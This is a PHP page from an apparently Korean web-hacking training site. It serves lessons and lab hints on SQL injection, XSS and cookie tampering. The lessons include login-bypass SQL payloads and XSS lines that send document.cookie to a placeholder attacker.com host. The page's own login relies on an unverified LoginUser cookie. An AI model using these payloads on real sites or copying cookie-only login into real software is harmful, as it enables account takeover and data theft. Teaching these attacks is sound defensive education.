<?php
require_once 'config.php';
session_start();

$conn     = db_connect();
init_progress_table($conn);

$loggedIn = isset($_COOKIE['LoginUser']);
if (!$loggedIn) { header('Location: login.html'); exit; }

$userId   = (int)$_COOKIE['LoginUser'];
$catId    = (int)($_GET['id'] ?? 0);
$stage    = (int)($_GET['stage'] ?? 0);

if (!isset($CATEGORIES[$catId])) { header('Location: index.php'); exit; }

/* 유저 정보 */
$stmt = mysqli_prepare($conn, "SELECT username, score FROM userTBL WHERE id = ?");
mysqli_stmt_bind_param($stmt, 'i', $userId);
mysqli_execute($stmt);
$userRow  = mysqli_fetch_assoc(mysqli_stmt_get_result($stmt));
$username = $userRow['username'];
$score    = $userRow['score'];
mysqli_stmt_close($stmt);

$progress = get_user_progress($conn, $userId);
$cat      = $CATEGORIES[$catId];
$stages   = $cat['stages'];

/* 이전 카테고리 lab 완료 여부 확인 */
if ($catId > 1) {
    $prevCat = $CATEGORIES[$catId - 1];
    foreach ($prevCat['stages'] as $ps) {
        if ($ps['type'] === 'lab' && empty($progress[$ps['key']])) {
            header('Location: index.php'); exit;
        }
    }
}

/* 이론 완료 POST 처리 */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mark_theory'])) {
    $theoryKey = $_POST['stage_key'];
    $targetIdx = 0;
    foreach ($stages as $idx => $s) {
        if ($s['key'] === $theoryKey && $s['type'] === 'theory') {
            $targetIdx = $idx;
            $allowed   = ($idx === 0) || !empty($progress[$stages[$idx - 1]['key']]);
            if ($allowed) {
                /* 중복 방지: INSERT IGNORE 후 affected_rows 확인 */
                $checkStmt = mysqli_prepare($conn, "SELECT user_id FROM user_progress WHERE user_id = ? AND stage_key = ?");
                mysqli_stmt_bind_param($checkStmt, 'is', $userId, $theoryKey);
                mysqli_execute($checkStmt);
                mysqli_stmt_store_result($checkStmt);
                $alreadyDone = (mysqli_stmt_num_rows($checkStmt) > 0);
                mysqli_stmt_close($checkStmt);

                if (!$alreadyDone) {
                    mark_progress($conn, $userId, $theoryKey);
                    $pts = $s['points'];
                    $upd = mysqli_prepare($conn, "UPDATE userTBL SET score = score + ? WHERE id = ?");
                    mysqli_stmt_bind_param($upd, 'ii', $pts, $userId);
                    mysqli_execute($upd);
                    mysqli_stmt_close($upd);
                }
            }
            break;
        }
    }
    header('Location: category.php?id=' . $catId . '&stage=' . ($targetIdx + 2));
    exit;
}

/* 현재 표시할 스테이지 결정 */
if ($stage <= 0 || $stage > count($stages)) $stage = 1;
$currentStage = $stages[$stage - 1];

/* 현재 스테이지 잠금 여부 */
$isLocked = ($stage > 1) && empty($progress[$stages[$stage - 2]['key']]);

/* 랩 시작: 챌린지 토큰 생성 후 리디렉션 */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['start_lab'])) {
    $challenge = $currentStage['challenge'];
    $token     = make_challenge_token($userId, $challenge);
    $_SESSION['lab_main_uid']   = $userId;
    $_SESSION['lab_challenge']  = $challenge;
    $_SESSION['lab_token']      = $token;

    $labUrls = [
        'sqli'   => SHOP_URL  . '/index.php?main_uid=' . $userId . '&token=' . $token,
        'xss'    => BOARD_URL . '/write.php?main_uid=' . $userId . '&token=' . $token,
        'cookie' => BOARD_URL . '/index.php?main_uid=' . $userId . '&token=' . $token,
    ];
    $url = $labUrls[$challenge] ?? BOARD_URL . '/index.php';
    header('Location: ' . $url);
    exit;
}

mysqli_close($conn);

/* ── 이론 콘텐츠 ── */
$theoryContent = [
    'theory_1' => <<<HTML
<h5 class="fw-bold">SQL Injection이란?</h5>
<p>SQL Injection은 사용자 입력 값을 DB 쿼리에 직접 삽입할 때 발생하는 취약점입니다.
   공격자는 쿼리의 논리를 변경하여 <strong>인증 우회, 데이터 탈취, DB 파괴</strong>를 유발할 수 있습니다.</p>

<h5 class="fw-bold mt-4">취약한 코드 예시</h5>
<pre class="bg-dark text-success rounded p-3"><code>\$sql = "SELECT * FROM users WHERE username='\$username' AND password='\$password'";</code></pre>
<p>위 코드에서 <code>username</code>에 <code>admin' -- </code>을 입력하면:</p>
<pre class="bg-dark text-warning rounded p-3"><code>SELECT * FROM users WHERE username='admin' -- ' AND password='anything'</code></pre>
<p><code>--</code> 이후는 주석 처리되어 비밀번호 검증이 <strong>완전히 무력화</strong>됩니다.</p>

<h5 class="fw-bold mt-4">주요 페이로드</h5>
<table class="table table-bordered table-sm">
  <thead class="table-dark"><tr><th>목적</th><th>페이로드</th></tr></thead>
  <tbody>
    <tr><td>로그인 우회</td><td><code>' OR '1'='1' -- </code></td></tr>
    <tr><td>특정 계정 로그인</td><td><code>admin' -- </code></td></tr>
    <tr><td>UNION 기반 추출</td><td><code>' UNION SELECT 1,2,3 -- </code></td></tr>
  </tbody>
</table>

<h5 class="fw-bold mt-4">방어 방법</h5>
<ul>
  <li><strong>Prepared Statement (파라미터 바인딩)</strong> 사용 — 가장 효과적</li>
  <li>입력값 화이트리스트 검증</li>
  <li>최소 권한 DB 계정 사용</li>
  <li>에러 메시지 노출 차단</li>
</ul>
HTML,

    'theory_2' => <<<HTML
<h5 class="fw-bold">Cross-Site Scripting (XSS)이란?</h5>
<p>XSS는 공격자가 웹 페이지에 <strong>악성 스크립트</strong>를 삽입하여 다른 사용자의 브라우저에서 실행되게 하는 공격입니다.</p>

<h5 class="fw-bold mt-4">XSS의 종류</h5>
<ul>
  <li><strong>Stored XSS</strong> — 서버 DB에 스크립트 저장 → 다른 사용자 방문 시 실행</li>
  <li><strong>Reflected XSS</strong> — URL 파라미터에 삽입 → 즉시 반사 실행</li>
  <li><strong>DOM-based XSS</strong> — 클라이언트 JS가 DOM을 조작할 때 발생</li>
</ul>

<h5 class="fw-bold mt-4">취약한 코드 예시</h5>
<pre class="bg-dark text-success rounded p-3"><code>&lt;?php echo \$rows['content']; ?&gt;</code></pre>
<p>게시글 내용을 <code>htmlspecialchars</code> 없이 그대로 출력하면 XSS가 발생합니다.</p>

<h5 class="fw-bold mt-4">공격 페이로드 예시</h5>
<pre class="bg-dark text-warning rounded p-3"><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)"&gt;
&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;</code></pre>

<h5 class="fw-bold mt-4">방어 방법</h5>
<ul>
  <li>출력 시 <strong>htmlspecialchars()</strong> 적용</li>
  <li>Content Security Policy (CSP) 헤더 설정</li>
  <li>HttpOnly 쿠키 플래그 사용</li>
  <li>입력값 서버측 검증 및 화이트리스트 필터링</li>
</ul>
HTML,

    'theory_3' => <<<HTML
<h5 class="fw-bold">쿠키 변조(Cookie Tampering)란?</h5>
<p>웹 애플리케이션이 사용자 인증이나 권한을 <strong>쿠키 값에만 의존</strong>할 때, 공격자가 쿠키를 변조하여 다른 사용자(특히 관리자)로 위장하는 공격입니다.</p>

<h5 class="fw-bold mt-4">취약한 쿠키 인증 예시</h5>
<pre class="bg-dark text-success rounded p-3"><code>// 서버가 LoginUser 쿠키 ID만으로 사용자를 식별
\$userId = (int)\$_COOKIE['LoginUser'];  // 변조 가능!
\$query  = "SELECT * FROM users WHERE id = '\$userId'";</code></pre>
<p>쿠키 값이 서버에서 검증되지 않으면 공격자는 <strong>브라우저 개발자 도구</strong>로 쿠키를 수정할 수 있습니다.</p>

<h5 class="fw-bold mt-4">쿠키 변조 방법</h5>
<ol>
  <li>브라우저 개발자 도구 열기 (F12)</li>
  <li>Application → Cookies 탭 이동</li>
  <li><code>LoginUser</code> 쿠키 값을 원하는 사용자 ID로 변경</li>
  <li>페이지 새로고침 → 변조된 계정으로 접속</li>
</ol>
<pre class="bg-dark text-warning rounded p-3"><code>// 브라우저 콘솔에서 직접 쿠키 변경
document.cookie = "LoginUser=1; path=/";</code></pre>

<h5 class="fw-bold mt-4">방어 방법</h5>
<ul>
  <li><strong>서버측 세션(Session)</strong> 사용 — 쿠키에 ID 대신 세션 토큰 저장</li>
  <li>쿠키에 <strong>HMAC 서명</strong> 추가하여 무결성 검증</li>
  <li><code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> 플래그 설정</li>
  <li>중요 작업 시 추가 인증 요구</li>
</ul>
HTML,
];
?>
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title><?= htmlspecialchars($cat['name']) ?> — Web Hacking Zone</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    .logo-img      { max-width:125px; height:125px; display:block; margin:30px auto; }
    .stage-item    { cursor:pointer; border-radius:10px; padding:12px 16px; margin-bottom:8px; border:1px solid #dee2e6; transition:.2s; }
    .stage-item:hover { background:#f8f9fa; }
    .stage-item.active{ background:#0d6efd; color:#fff; border-color:#0d6efd; }
    .stage-item.done  { border-color:#198754; }
    .stage-item.locked{ opacity:.5; cursor:not-allowed; }
    .content-panel { min-height:500px; border:1px solid #dee2e6; border-radius:12px; padding:28px; background:#fff; }
    .theory-content pre { font-size:.85rem; }
    .score-badge   { background:#ffd700; color:#333; font-weight:700; border-radius:20px; padding:4px 14px; }
    .lab-hint      { background:#fff3cd; border-radius:10px; padding:20px; border-left:4px solid #ffc107; }
  </style>
</head>
<body class="bg-light">

<!-- 네비게이션 -->
<nav class="container-fluid px-4 position-relative d-flex justify-content-between align-items-center" style="height:110px;">
  <div class="fw-bold">
    <a href="index.php" class="text-decoration-none text-dark fs-3">home</a>
  </div>
  <div class="position-absolute top-50 start-50 translate-middle">
    <img src="./images/HoneyRain.png" alt="logo" class="logo-img">
  </div>
  <div class="text-end d-flex align-items-center gap-3">
    <span class="score-badge">🏆 <?= $score ?>점</span>
    <span class="small fw-medium fs-5"><?= htmlspecialchars($username) ?>님</span>
    <a href="logout.php" class="text-decoration-none text-dark fw-bold fs-4">logout</a>
  </div>
</nav>
<hr>

<div class="container my-4">
  <!-- 상단 경로 -->
  <nav aria-label="breadcrumb" class="mb-3">
    <ol class="breadcrumb">
      <li class="breadcrumb-item"><a href="index.php">홈</a></li>
      <li class="breadcrumb-item active"><?= htmlspecialchars($cat['name']) ?></li>
    </ol>
  </nav>

  <div class="row g-4">
    <!-- ── 왼쪽: 스테이지 목록 ── -->
    <div class="col-md-3">
      <div class="card shadow-sm p-3">
        <h6 class="fw-bold mb-3"><?= $cat['icon'] ?> <?= htmlspecialchars($cat['name']) ?></h6>
        <?php foreach ($stages as $idx => $s):
          $done   = !empty($progress[$s['key']]);
          $locked = ($idx > 0) && empty($progress[$stages[$idx - 1]['key']]);
          $active = ($idx + 1 === $stage);
          $cls    = $active ? 'active' : ($locked ? 'locked' : ($done ? 'done text-success' : ''));
        ?>
          <a href="<?= $locked ? '#' : 'category.php?id=' . $catId . '&stage=' . ($idx + 1) ?>"
             class="stage-item text-decoration-none <?= $cls ?> <?= $active ? 'text-white' : 'text-dark' ?>">
            <span class="me-2"><?= $done ? '✅' : ($locked ? '🔒' : ($s['type'] === 'theory' ? '📖' : '🔬')) ?></span>
            <span class="small"><?= ($idx + 1) ?>단계: <?= htmlspecialchars($s['title']) ?></span>
            <br><small class="<?= $active ? 'text-white-50' : 'text-muted' ?>">+<?= $s['points'] ?>점</small>
          </a>
        <?php endforeach; ?>
        <hr>
        <a href="scoreboard.php" class="btn btn-outline-warning btn-sm w-100">🏆 랭킹 보기</a>
      </div>
    </div>

    <!-- ── 오른쪽: 콘텐츠 패널 ── -->
    <div class="col-md-9">
      <?php if ($isLocked): ?>
        <div class="content-panel d-flex align-items-center justify-content-center">
          <div class="text-center text-muted">
            <div style="font-size:4rem">🔒</div>
            <h4 class="mt-3">이전 단계를 먼저 완료하세요</h4>
            <p>단계를 순서대로 완료해야 다음 단계에 도전할 수 있습니다.</p>
            <a href="category.php?id=<?= $catId ?>&stage=<?= $stage - 1 ?>" class="btn btn-primary">이전 단계로</a>
          </div>
        </div>

      <?php elseif ($currentStage['type'] === 'theory'): ?>
        <!-- ─ 이론 콘텐츠 ─ -->
        <div class="content-panel">
          <div class="d-flex justify-content-between align-items-start mb-4">
            <div>
              <span class="badge bg-primary mb-2">이론 학습</span>
              <h4 class="fw-bold"><?= htmlspecialchars($currentStage['title']) ?></h4>
            </div>
            <?php if (!empty($progress[$currentStage['key']])): ?>
              <span class="badge bg-success fs-6">✅ 완료</span>
            <?php endif; ?>
          </div>

          <div class="theory-content">
            <?= $theoryContent[$currentStage['key']] ?? '<p>콘텐츠를 불러올 수 없습니다.</p>' ?>
          </div>

          <?php if (empty($progress[$currentStage['key']])): ?>
            <hr>
            <form method="POST">
              <input type="hidden" name="mark_theory" value="1">
              <input type="hidden" name="stage_key" value="<?= htmlspecialchars($currentStage['key']) ?>">
              <button type="submit" class="btn btn-success btn-lg px-5">
                ✅ 이론 학습 완료 (+<?= $currentStage['points'] ?>점)
              </button>
            </form>
          <?php else: ?>
            <hr>
            <?php if ($stage < count($stages)): ?>
              <a href="category.php?id=<?= $catId ?>&stage=<?= $stage + 1 ?>" class="btn btn-primary btn-lg px-5">
                다음 단계로 →
              </a>
            <?php else: ?>
              <a href="index.php" class="btn btn-success btn-lg px-5">🎉 카테고리 완료! 홈으로</a>
            <?php endif; ?>
          <?php endif; ?>
        </div>

      <?php else: ?>
        <!-- ─ 실습 랩 ─ -->
        <div class="content-panel">
          <div class="d-flex justify-content-between align-items-start mb-4">
            <div>
              <span class="badge bg-danger mb-2">실습 랩</span>
              <h4 class="fw-bold"><?= htmlspecialchars($currentStage['title']) ?></h4>
            </div>
            <?php if (!empty($progress[$currentStage['key']])): ?>
              <span class="badge bg-success fs-6">✅ 완료</span>
            <?php endif; ?>
          </div>

          <?php if (!empty($progress[$currentStage['key']])): ?>
            <div class="alert alert-success">
              🎉 이 실습을 성공적으로 완료했습니다! <strong>+<?= $currentStage['points'] ?>점</strong> 획득
            </div>
            <?php if ($stage < count($stages)): ?>
              <a href="category.php?id=<?= $catId ?>&stage=<?= $stage + 1 ?>" class="btn btn-primary me-2">다음 단계 →</a>
            <?php else: ?>
              <a href="index.php" class="btn btn-success me-2">🎉 카테고리 완료! 홈으로</a>
            <?php endif; ?>
            <?php
            $challenge = $currentStage['challenge'];
            $labUrls = [
                'sqli'   => SHOP_URL  . '/index.php',
                'xss'    => BOARD_URL . '/index.php',
                'cookie' => BOARD_URL . '/index.php',
            ];
            ?>
            <a href="<?= $labUrls[$challenge] ?? '#' ?>" class="btn btn-outline-secondary">다시 풀어보기</a>

          <?php else: ?>
            <?php
            $challenge  = $currentStage['challenge'];
            $hints = [
                'sqli' => [
                    'goal'  => '쇼핑몰의 로그인 페이지에서 SQL Injection을 이용해 <strong>admin 계정으로 로그인</strong>하세요.',
                    'hint1' => '로그인 폼의 아이디 입력란에 SQL 특수문자를 삽입해보세요.',
                    'hint2' => "username: <code>admin' -- </code> &nbsp; password: (아무 값)",
                    'target'=> '쇼핑몰 로그인 페이지',
                ],
                'xss'  => [
                    'goal'  => '게시판에 <strong>XSS 스크립트 태그</strong>가 포함된 게시글을 작성하세요. 작성 후 "관리자에게 신고" 버튼을 클릭하면 자동으로 성공 처리됩니다.',
                    'hint1' => '게시글 내용에 &lt;script&gt; 태그를 삽입해보세요.',
                    'hint2' => "예시: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>",
                    'target'=> '게시판 글쓰기 페이지',
                ],
                'cookie' => [
                    'goal'  => '브라우저 개발자 도구로 <strong>LoginUser 쿠키 값을 변조</strong>하여 게시판의 숨겨진 FLAG를 찾으세요. 성공하면 자동으로 완료 처리됩니다.',
                    'hint1' => 'F12 → Application → Cookies → LoginUser 값을 변경해보세요.',
                    'hint2' => '브라우저 콘솔에서: <code>document.cookie = "LoginUser=999; path=/"</code>',
                    'target'=> '게시판 메인 페이지',
                ],
            ];
            $hint = $hints[$challenge] ?? [];
            ?>
            <div class="lab-hint mb-4">
              <h6 class="fw-bold">🎯 목표</h6>
              <p class="mb-2"><?= $hint['goal'] ?? '' ?></p>
              <details class="mt-2">
                <summary class="fw-semibold text-warning" style="cursor:pointer">💡 힌트 1 보기</summary>
                <p class="mt-2 mb-0"><?= $hint['hint1'] ?? '' ?></p>
              </details>
              <details class="mt-2">
                <summary class="fw-semibold text-danger" style="cursor:pointer">💡 힌트 2 (정답 거의 노출)</summary>
                <p class="mt-2 mb-0"><?= $hint['hint2'] ?? '' ?></p>
              </details>
            </div>

            <form method="POST">
              <input type="hidden" name="start_lab" value="1">
              <button type="submit" class="btn btn-danger btn-lg px-5">
                🔬 <?= htmlspecialchars($hint['target'] ?? '실습') ?> 열기
              </button>
            </form>
          <?php endif; ?>
        </div>
      <?php endif; ?>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
